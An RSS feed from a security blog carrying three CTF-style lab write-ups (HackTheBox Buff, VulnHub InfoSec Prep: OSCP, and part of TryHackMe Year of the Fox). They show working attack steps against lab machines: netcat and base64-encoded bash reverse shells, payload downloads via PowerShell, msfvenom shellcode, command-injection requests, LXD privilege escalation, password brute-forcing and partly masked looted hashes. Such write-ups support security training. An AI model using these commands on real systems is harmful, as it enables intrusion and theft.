<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Manthan</title>
    <description>security research | code | writeups</description>
    <link>https://7h3ram.github.io/</link>
    <atom:link href="https://7h3ram.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <language>en-us</language>
    <lastBuildDate>Wed, 28 Jan 2026 22:49:59 +0000</lastBuildDate>
        <item>
      <title>[HackTheBox] Buff</title>
      <link>https://7h3ram.github.io/posts/20201124_htb-buff.html</link>
      <guid>https://7h3ram.github.io/posts/20201124_htb-buff.html</guid>
      <pubDate>Tue, 24 Nov 2020 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for HackTheBox VM <a href="https://www.hackthebox.eu/home/machines/profile/263">Buff</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_buff/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_buff/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>8080/tcp/http/Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_gymsystem_rce">exploit_gymsystem_rce</a>, <a href="https://github.com/7h3rAm/writeups#exploit_cloudme_bof">exploit_cloudme_bof</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.80 scan initiated Wed Jul 22 21:04:22 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/htb.buff/10.10.10.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/htb.buff/10.10.10.198/scans/xml/_quick_tcp_nmap.xml 10.10.10.198
Nmap scan report for 10.10.10.198
Host is up, received user-set (0.34s latency).
Scanned at 2020-07-22 21:04:36 IST for 101s
Not shown: 999 filtered ports
Reason: 999 no-responses
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 22 21:06:17 2020 -- 1 IP address (1 host up) scanned in 114.83 seconds
</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_buff/openports.png.webp" />  </p>
<p>3. We find <code>8080/tcp</code> to be open and running <code>Apache httpd 2.4.43</code>. We start by looking at the webpage and find it be hosting a fitness center portal:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_buff/screenshot01.png.webp" />  </p>
<p>4. We find multiple pages from the <code>gobuster</code> scan results and upon visiting <code>/contacts.php</code> page, we find that we are interacting with the <code>Gym Management Software 1.0</code> web application:  </p>
<pre><code>cat ./10.10.10.198/scans/tcp_8080_http_gobuster.txt | grep -v 403
  /ADMIN (Status: 301) [Size: 343]
  /About.php (Status: 200) [Size: 5337]
  /Admin (Status: 301) [Size: 343]
  /Contact.php (Status: 200) [Size: 4169]
  /Home.php (Status: 200) [Size: 143]
  /Index.php (Status: 200) [Size: 4969]
  /LICENSE (Status: 200) [Size: 18025]
  /about.php (Status: 200) [Size: 5337]
  /admin (Status: 301) [Size: 343]
  /boot (Status: 301) [Size: 342]
  /contact.php (Status: 200) [Size: 4169]
  /edit.php (Status: 200) [Size: 4282]
  /ex (Status: 301) [Size: 340]
  /feedback.php (Status: 200) [Size: 4252]
  /home.php (Status: 200) [Size: 143]
  /img (Status: 301) [Size: 341]
  /include (Status: 301) [Size: 345]
  /index.php (Status: 200) [Size: 4969]
  /index.php (Status: 200) [Size: 4969]
  /license (Status: 200) [Size: 18025]
  /packages.php (Status: 200) [Size: 7791]
  /profile (Status: 301) [Size: 345]
  /register.php (Status: 200) [Size: 137]
  /up.php (Status: 200) [Size: 209]
  /upload (Status: 301) [Size: 344]
  /upload.php (Status: 200) [Size: 107]
</code></pre>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_buff/screenshot02.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>8080/tcp   http         Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We use <code>searchsploit</code> to find exploits for the webapp and find an unauthenticated remote code execution vulnerability. We inspect the exploit and upon executing it, we get a pseudo-interactive shell on the target machine:  </p>
<pre><code>python 48506.py http://10.10.10.198:8080/
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_buff/screenshot03.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_buff/screenshot04.png.webp" />  </p>
<p>2. To get a fully interactive shell, we use powershell to transfer netcat binary, start a local netcat listener and then catch the incoming connection:  </p>
<pre><code>nc -nlvp 4433

powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/nc.exe','C:\Users\shaun\Desktop\nc.exe')&quot;
C:\Users\shaun\Desktop\nc.exe 10.10.14.8 4433 -e cmd.exe
</code></pre>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_buff/screenshot05.png.webp" />  </p>
<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_buff/screenshot06.png.webp" />  </p>
<p>3. We use this interactive access to read the <code>user.txt</code> flag:  </p>
<pre><code>type C:\Users\shaun\Desktop\user.txt
</code></pre>
<p><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_htb_buff/screenshot07.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>buff\shaun@BUFF&gt; id
buff\shaun
buff\shaun@BUFF&gt;  
buff\shaun@BUFF&gt; uname
Host Name:                 BUFF
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
buff\shaun@BUFF&gt;  
buff\shaun@BUFF&gt; ifconfig
Windows IP Configuration
  Ethernet adapter Ethernet0:
    Connection-specific DNS Suffix  . :
    IPv6 Address. . . . . . . . . . . : dead:beef::616c:bed8:4b75:6e17
    Temporary IPv6 Address. . . . . . : dead:beef::7813:413b:2e52:5901
    Link-local IPv6 Address . . . . . : fe80::616c:bed8:4b75:6e17%10
    IPv4 Address. . . . . . . . . . . : 10.10.10.198
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9eb2%10
                                        10.10.10.2
buff\shaun@BUFF&gt;  
buff\shaun@BUFF&gt; users
Administrator
shaun
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. We use <code>winPEAS.exe</code> to enumerate the target machine and within the <code>services restricted from the outside</code> section, find an interesting service bound to <code>127.0.0.1:8888</code>:  </p>
<pre><code>netstat -anp tcp
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_htb_buff/screenshot08.png.webp" />  </p>
<p>2. We find this to be a <code>CloudMe</code> process and there's a binary named <code>CloudMe_1112.exe</code> within the <code>C:\Users\shaun\Downloads</code> directory that hints that the version could be <code>1.11.2</code>:  </p>
<pre><code>powershell ps
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_htb_buff/screenshot09.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_htb_buff/screenshot10.png.webp" />  </p>
<p>3. We find a buffer overflow exploit for this application that could give us elevated privileges if the <code>CloudMe</code> process is running as Administrator:  </p>
<pre><code>searchsploit cloudme
</code></pre>
<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_buff/screenshot11.png.webp" />  </p>
<p>4. But we cannot connect to this service from our attacking machine. We will need to setup a port forward for this exploit to work. We start the SSH service on our attacking machine, transfer the <code>plink.exe</code> binary and setup the port forward:  </p>
<pre><code>service ssh restart
service ssh status
powershell -c &quot;(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:8000/plink64.exe','C:\Users\shaun\Desktop\plink.exe')&quot;
C:\Users\shaun\Desktop\plink.exe -v -x -a -T -C -noagent -ssh -pw &quot;kali&quot; -R 8888:127.0.0.1:8888 kali@10.10.14.8
</code></pre>
<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_htb_buff/screenshot12.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_htb_buff/screenshot13.png.webp" />  </p>
<p>5. We update the exploit with the right shellcode, setup a reverse shell to catch incoming connection and run the exploit:  </p>
<pre><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.8 lport=443 -b &quot;\x00\x0a\x0d&quot; -f python -a x86 --platform windows -e x86/shikata_ga_nai

sudo nc -nlvp 443
python 48389.py
</code></pre>
<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_htb_buff/screenshot14.png.webp" />  </p>
<p>6. We immmediately get an elevated reverse shell connection and use it to read the <code>root.txt</code> flag:  </p>
<pre><code>type C:\Users\Administrator\Desktop\root.txt
</code></pre>
<p><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_htb_buff/screenshot15.png.webp" />  </p>
<h2>References</h2>
<ul>
<li><a href="https://www.hackthebox.eu/home/machines/profile/263">https://www.hackthebox.eu/home/machines/profile/263</a>  </li>
</ul>]]></description>
      <category>hackthebox</category><category>writeup</category>    </item>
        <item>
      <title>[VulnHub] InfoSec Prep: OSCP</title>
      <link>https://7h3ram.github.io/posts/20200810_vulnhub-infosecpreposcp.html</link>
      <guid>https://7h3ram.github.io/posts/20200810_vulnhub-infosecpreposcp.html</guid>
      <pubDate>Mon, 10 Aug 2020 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_infosecpreposcp/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_infosecpreposcp/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Apache httpd 2.4.41 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_ssh_privatekeys">exploit_ssh_privatekeys</a>, <a href="https://github.com/7h3rAm/writeups#privesc_lxc_bash">privesc_lxc_bash</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.80 scan initiated Mon Jul 20 12:03:57 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/xml/_quick_tcp_nmap.xml 192.168.119.198
Nmap scan report for 192.168.119.198
Host is up, received user-set (0.0022s latency).
Scanned at 2020-07-20 12:04:12 IST for 9s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &amp;#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 20 12:04:21 2020 -- 1 IP address (1 host up) scanned in 24.59 seconds

</code></pre>
<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/openports.png.webp" />  </p>
<p>3. We find <code>80/tcp</code> to be open. Upon browsing the webpage we see that it looks to be a Wordpress blog with a post named "OSCP Voucher". This posts lists the process to submit the flag and also mentions that there's a user named <code>oscp</code> on this machine:  </p>
<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot01.png.webp" />  </p>
<p>4. The <code>gobuster</code> scan result confirms that this is a Wordpress blog. We see an interesting entry <code>secret.txt</code> from <code>gobuster</code> scan results and also from the <code>robots.txt</code> file:  </p>
<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot02.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot03.png.webp" />  </p>
<p>5. This file has base64 encoded content that we decode to find a SSH private key file:  </p>
<pre><code>curl http://192.168.119.198/secret.txt | base64 -d -
</code></pre>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot04.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>22/tcp      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux protocol 2.0)
80/tcp      http       Apache httpd 2.4.41 ((Ubuntu))
33060/tcp   socks5
</code></pre>
<h4>Files</h4>
<pre><code>http://192.168.119.198/secret.txt
http://192.168.119.198/license.txt
</code></pre>
<h4>Users</h4>
<pre><code>ssh: oscp
wordpress: admin
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We can try to SSH into the machine as user <code>oscp</code> using the SSH private key file. First, we need to set right permissions to the key file and then use it for login:  </p>
<pre><code>curl http://192.168.119.198/secret.txt | base64 -d - &gt;./sshkey.pvt
chmod 600 sshkey.pvt
ssh -i sshkey.pvt oscp@192.168.119.198
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot05.png.webp" />  </p>
<p>2. We successfully login and get interactive access of the machine as user <code>oscp</code>:  </p>
<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot06.png.webp" />  </p>
<h2>Phase #2.5: Post Exploitation</h2>
<pre><code>oscp@oscp&gt; id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
oscp@oscp&gt;  
oscp@oscp&gt; uname
Linux oscp 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
oscp@oscp&gt;  
oscp@oscp&gt; ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
  inet 192.168.119.198  netmask 255.255.255.0  broadcast 192.168.119.255
  inet6 fe80::20c:29ff:fee6:a4ab  prefixlen 64  scopeid 0x20&lt;link&gt;
  ether 00:0c:29:e6:a4:ab  txqueuelen 1000  (Ethernet)
  RX packets 389730  bytes 88031188 (88.0 MB)
  RX errors 0  dropped 0  overruns 0  frame 0
  TX packets 297471  bytes 52912167 (52.9 MB)
  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 694  bytes 64212 (64.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 694  bytes 64212 (64.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
oscp@oscp&gt;  
oscp@oscp&gt; users
root
oscp
</code></pre>
<h2>Phase #3: Privilege Escalation</h2>
<p>1. From the output of command <code>id</code>, we see that the user <code>oscp</code> is a member of <code>lxd</code> group. We can exploit this misconfiguration to create a dummy container that mounts the local file system and gain access to all privileged files. But we see that the <code>lxc</code> command for this to work is not found in our current environment path:  </p>
<pre><code>lxc init ubuntu:16.04 test -c security.privileged=true
  -bash: lxc: command not found
</code></pre>
<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot09.png.webp" />  </p>
<p>2. We locate the file and use it's absolute path to create the container. This time we see another error about storage pool. The error message helpfully points us in the right direction and we need to initialize LXD first. We use the suggested command with the absolute path and choose default settings when prompted for a change:  </p>
<pre><code>/snap/bin/lxd init
/snap/bin/lxc init ubuntu:16.04 test -c security.privileged=true
/snap/bin/lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
/snap/bin/lxc start test
/snap/bin/lxc exec test bash
</code></pre>
<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot10.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.2" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot11.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.3" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot12.png.webp" />  </p>
<p><img alt="writeup.privesc.steps.2.4" src="/static/files/posts_vulnhub_infosecpreposcp/screenshot13.png.webp" />  </p>
<h2>Learning/Recommendation</h2>
<ul>
<li>The SSH key for a user on the target machine was exposed via web application. Although the file was base64 encoded and listed within <code>robots.txt</code>, it doesn't stop an attacker from accessing it.</li>
<li>The local user was member of the LXD group which allowed to create a privileged container with access to the entire file system. This lead to complete access of files, even those that have been restricted to <code>root</code> user only.</li>
</ul>
<h2>Loot</h2>
<h3>Hashes</h3>
<pre><code>oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmB.........................
root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEg.........................
</code></pre>
<h3>Credentials</h3>
<pre><code>mysql: wordpress/Oscp12....
wordpress: admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2........
</code></pre>
<h3>Flags</h3>
<pre><code>/mnt/root/root/flag.txt: d73b04b0e696b0945283d...........
</code></pre>
<h2>References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">https://www.vulnhub.com/entry/infosec-prep-oscp,508/</a>  </li>
<li><a href="https://reboare.github.io/lxd/lxd-escape.html">https://reboare.github.io/lxd/lxd-escape.html</a>  </li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation</a>  </li>
<li><a href="https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025">https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025</a>  </li>
</ul>]]></description>
      <category>vulnhub</category><category>writeup</category>    </item>
        <item>
      <title>[TryHackMe] Year of the Fox</title>
      <link>https://7h3ram.github.io/posts/20200730_thm-yotf.html</link>
      <guid>https://7h3ram.github.io/posts/20200730_thm-yotf.html</guid>
      <pubDate>Thu, 30 Jul 2020 00:00:00 +0000</pubDate>
      <description><![CDATA[<h2>Overview</h2>
<p>This is a writeup for TryHackMe VM <a href="https://tryhackme.com/room/yotf">Year of the Fox</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p><img alt="writeup.overview.machinescli" src="/static/files/posts_thm_yotf/machinescli.png.webp" /></p>
<h3>Killchain</h3>
<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p><img alt="writeup.overview.killchain" src="/static/files/posts_thm_yotf/killchain.png.webp" /></p>
<h3>TTPs</h3>
<p>1. <code>80/tcp/http/Apache httpd 2.4.29</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_http">enumerate_proto_http</a>, <a href="https://github.com/7h3rAm/writeups#exploit_command_injection">exploit_command_injection</a>, <a href="https://github.com/7h3rAm/writeups#privesc_env_relative_path">privesc_env_relative_path</a>  </p>
<h2>Phase #1: Enumeration</h2>
<p>1. Here's the Nmap scan result:  </p>
<pre><code># Nmap 7.80 scan initiated Wed Jul 29 19:54:07 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/thm.yotf/10.10.41.240/scans/xml/_quick_tcp_nmap.xml 10.10.41.240
Increasing send delay for 10.10.41.240 from 0 to 5 due to 25 out of 82 dropped probes since last increase.
Nmap scan report for 10.10.41.240
Host is up, received user-set (0.21s latency).
Scanned at 2020-07-29 19:54:22 IST for 42s
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT    STATE SERVICE     REASON  VERSION
80/tcp  open  http        syn-ack Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   YEAR-OF-THE-FOX&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   YEAR-OF-THE-FOX&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   YEAR-OF-THE-FOX&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   YEAROFTHEFOX&lt;00&gt;     Flags: &lt;group&gt;&lt;active&gt;
|   YEAROFTHEFOX&lt;1d&gt;     Flags: &lt;unique&gt;&lt;active&gt;
|   YEAROFTHEFOX&lt;1e&gt;     Flags: &lt;group&gt;&lt;active&gt;
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 57972/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24267/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 63864/udp): CLEAN (Failed to receive data)
|   Check 4 (port 42720/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2020-07-29T15:24:57+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-29T14:24:57
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 29 19:55:04 2020 -- 1 IP address (1 host up) scanned in 56.96 seconds
</code></pre>
<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_thm_yotf/openports.png.webp" />  </p>
<p>3. We find <code>80/tcp</code> to be open and enumerate it further. The webapp enforces authentication due to which we are not allowed to view any pages. We will need to find the credentials for the web app to proceed with this further:  </p>
<p>4. From the scan results SMB for ports, we find that there are two active users on this machine: <code>fox</code> and <code>rascal</code>  </p>
<pre><code>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
  User Name   : fox
  Full Name   : fox
  Home Drive  : \\year-of-the-fox\fox
  Dir Drive   : 
  Profile Path: \\year-of-the-fox\fox\profile
  Logon Script: 

S-1-22-1-1001 Unix User\rascal (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.

 ============================================= 
|    Getting printer info for 10.10.41.240    |
 ============================================= 
No printers returned.

enum4linux complete on Wed Jul 29 20:18:34 2020
</code></pre>
<p>5. We run a password bruteforce scan against the webapp for both usernames and find a hit:  </p>
<pre><code>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.41.240 http-head /
</code></pre>
<p><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_thm_yotf/screenshot01.png.webp" />  </p>
<p>6. Upon logging in, we see a webpage with a search text box try out a few queries. Submitting an empty string shows a listing of 3 files. We setup Burp proxy and start enumerating the search functionality further:  </p>
<p><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_thm_yotf/screenshot02.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_thm_yotf/screenshot03.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.6.3" src="/static/files/posts_thm_yotf/screenshot04.png.webp" />  </p>
<p><img alt="writeup.enumeration.steps.6.4" src="/static/files/posts_thm_yotf/screenshot05.png.webp" />  </p>
<p>7. We find a way to escape the search input and get command execution on the target machine:  </p>
<pre><code>POST /assets/php/search.php HTTP/1.1
  Host: 10.10.41.240
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://10.10.41.240/
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 101
  Authorization: Basic cmFzY2FsOmxvdmU=
  Connection: close

  {&quot;target&quot;:&quot;\&quot;;whoami\n&quot;}
</code></pre>
<p><img alt="writeup.enumeration.steps.7.1" src="/static/files/posts_thm_yotf/screenshot06.png.webp" />  </p>
<p>8. We use this to triage the file system and find the first web flag file:  </p>
<pre><code>POST /assets/php/search.php HTTP/1.1
  Host: 10.10.41.240
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://10.10.41.240/
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 101
  Authorization: Basic cmFzY2FsOmxvdmU=
  Connection: close

  {&quot;target&quot;:&quot;\&quot;cat ../../../web-flag.txt;\n&quot;}
</code></pre>
<p><img alt="writeup.enumeration.steps.8.1" src="/static/files/posts_thm_yotf/screenshot07.png.webp" />  </p>
<h3>Findings</h3>
<h4>Open Ports</h4>
<pre><code>80/tcp    http          Apache httpd 2.4.29
139/tcp   netbios-ssn   Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp   netbios-ssn   Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
</code></pre>
<h4>Users</h4>
<pre><code>ssh: rascal, fox
webapp: rascal
</code></pre>
<h2>Phase #2: Exploitation</h2>
<p>1. We further leverage the command execution vulnerability to get interactive access on the target machine. For this, we first start a local netcat listener and use a bash reverse shell:  </p>
<pre><code>nc -nlvp 4433

POST /assets/php/search.php HTTP/1.1
  Host: 10.10.41.240
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: http://10.10.41.240/
  Content-Type: text/plain;charset=UTF-8
  Content-Length: 101
  Authorization: Basic cmFzY2FsOmxvdmU=
  Connection: close

  {&quot;target&quot;:&quot;\&quot;;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjI2LjE4OS80NDMzIDA+JjE=' | base64 -d | bash \n&quot;}
</code></pre>
<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_thm_yotf/screenshot08.png.webp" />  </p>
